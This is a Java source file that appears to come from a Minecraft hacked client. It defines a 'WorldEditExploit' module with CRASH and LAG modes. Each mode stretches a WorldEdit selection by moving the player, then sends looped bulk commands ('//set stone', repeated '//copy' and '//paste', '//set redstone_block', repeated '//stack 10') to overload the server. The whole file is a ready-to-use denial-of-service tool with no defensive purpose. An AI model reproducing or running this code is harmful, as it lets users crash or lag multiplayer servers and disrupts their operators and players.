package thunder.hack.features.modules.misc;

import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.util.math.BlockPos;
import thunder.hack.features.modules.Module;
import thunder.hack.setting.Setting;
import thunder.hack.utility.Timer;

public class WorldEditExploit extends Module {
    private final Setting<Mode> mode = new Setting<>("Mode", Mode.CRASH);
    private final Setting<Integer> delay = new Setting<>("Delay", 50, 0, 1000);
    private final Setting<Integer> size = new Setting<>("Size", 100, 10, 500);
    private final Setting<Boolean> autoDisable = new Setting<>("AutoDisable", true);
    
    private final Timer delayTimer = new Timer();
    private int stage = 0;
    private BlockPos pos1, pos2;
    
    public WorldEditExploit() {
        super("WorldEditExploit", Category.MISC);
    }

    @Override
    public void onEnable() {
        stage = 0;
        pos1 = null;
        pos2 = null;
    }

    @Override
    public void onUpdate() {
        if (mc.player == null || !delayTimer.passedMs(delay.getValue())) return;

        switch (mode.getValue()) {
            case CRASH -> doCrash();
            case LAG -> doLag();
        }
    }

    private void doCrash() {
        switch (stage) {
            case 0 -> {
                sendWorldEditCommand("//pos1");
                pos1 = mc.player.getBlockPos();
                stage++;
            }
            case 1 -> {
                BlockPos newPos = pos1.add(size.getValue(), size.getValue(), size.getValue());
                mc.player.setPosition(newPos.getX(), newPos.getY(), newPos.getZ());
                sendWorldEditCommand("//pos2");
                pos2 = newPos;
                stage++;
            }
            case 2 -> {
                sendWorldEditCommand("//set stone");
                stage++;
            }
            case 3 -> {
                // Создаем множество маленьких регионов
                for (int i = 0; i < 10; i++) {
                    sendWorldEditCommand("//copy");
                    sendWorldEditCommand("//paste");
                }
                if (autoDisable.getValue()) {
                    this.disable();
                }
                stage = 0;
            }
        }
        delayTimer.reset();
    }

    private void doLag() {
        switch (stage) {
            case 0 -> {
                sendWorldEditCommand("//pos1");
                pos1 = mc.player.getBlockPos();
                stage++;
            }
            case 1 -> {
                BlockPos newPos = pos1.add(size.getValue(), 1, size.getValue());
                mc.player.setPosition(newPos.getX(), newPos.getY(), newPos.getZ());
                sendWorldEditCommand("//pos2");
                pos2 = newPos;
                stage++;
            }
            case 2 -> {
                // Создаем сложную структуру с множеством блоков
                sendWorldEditCommand("//set redstone_block");
                stage++;
            }
            case 3 -> {
                // Спамим командами для создания нагрузки
                for (int i = 0; i < 5; i++) {
                    sendWorldEditCommand("//stack 10");
                }
                if (autoDisable.getValue()) {
                    this.disable();
                }
                stage = 0;
            }
        }
        delayTimer.reset();
    }

    private void sendWorldEditCommand(String command) {
        mc.getNetworkHandler().sendPacket(new ChatMessageC2SPacket(command, mc.player.getUuid()));
    }

    public enum Mode {
        CRASH,
        LAG
    }

    @Override
    public String getDisplayInfo() {
        return mode.getValue().name();
    }
}